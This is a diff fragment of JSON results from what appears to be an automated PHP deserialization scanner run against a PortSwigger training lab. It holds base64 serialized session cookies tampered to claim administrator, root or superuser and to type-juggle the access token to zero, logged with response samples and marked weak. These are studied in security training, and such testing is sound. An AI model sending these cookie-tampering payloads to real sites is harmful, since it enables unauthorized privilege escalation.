+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2691",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2691,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "type_juggle",
+          "chain": "access_token->i:0",
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2683",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2683,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "type_juggle_privesc",
+          "chain": "username=administrator + access_token=i:0",
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2479",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2479,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        }
+      ]
+    },
+    {
+      "url": "https://0aa700eb032e6b088118265c00b600c3.web-security-academy.net/product?productId=1",
+      "method": "GET",
+      "location": "cookie",
+      "name": "session",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Privilege Escalation — String Manipulation",
+      "suggested_probe": "modify_string",
+      "severity": "Medium",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "String field detected — try changing role/privilege value",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"c26fb9dc13q2g6v68vspsxxi4baxlwsx\";}"
+      ],
+      "mutations_count": 10,
+      "indicators": [
+        "Status code changed: baseline=200 mutated=500",
+        "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+      ],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImMyNmZiOWRjMTNxMmc2djY4dnNwc3h4aTRiYXhsd3N4Ijt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 4510,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2577,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImMyNmZiOWRjMTNxMmc2djY4dnNwc3h4aTRiYXhsd3N4Ijt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 4510,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2569,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6MTI6ImFjY2Vzc190b2tlbiI7czozMjoiYzI2ZmI5ZGMxM3EyZzZ2Njh2c3BzeHhpNGJheGx3c3giO30=",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 4510,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2568,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjk6InN1cGVydXNlciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjMjZmYjlkYzEzcTJnNnY2OHZzcHN4eGk0YmF4bHdzeCI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 4510,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2573,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 4510,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2793,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjU6ImFkbWluIjt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 4510,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2785,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjQ6InJvb3QiO30=",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 4510,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2784,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjk6InN1cGVydXNlciI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 4510,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2789,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "type_juggle",
+          "chain": "access_token->i:0",
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 4510,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2781,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "type_juggle_privesc",
+          "chain": "username=administrator + access_token=i:0",
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error _ssl.c:1063: The handshake operation timed out>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "https://0aa700eb032e6b088118265c00b600c3.web-security-academy.net/",
+      "method": "GET",
+      "location": "cookie",
+      "name": "session",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Privilege Escalation — String Manipulation",
+      "suggested_probe": "modify_string",
+      "severity": "Medium",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "String field detected — try changing role/privilege value",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"c26fb9dc13q2g6v68vspsxxi4baxlwsx\";}"
+      ],
+      "mutations_count": 10,
+      "indicators": [
+        "Status code changed: baseline=200 mutated=500",
+        "Response length changed significantly: baseline=10806 mutated=2479",
+        "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+      ],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImMyNmZiOWRjMTNxMmc2djY4dnNwc3h4aTRiYXhsd3N4Ijt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2479",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2479,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImMyNmZiOWRjMTNxMmc2djY4dnNwc3h4aTRiYXhsd3N4Ijt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2471",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
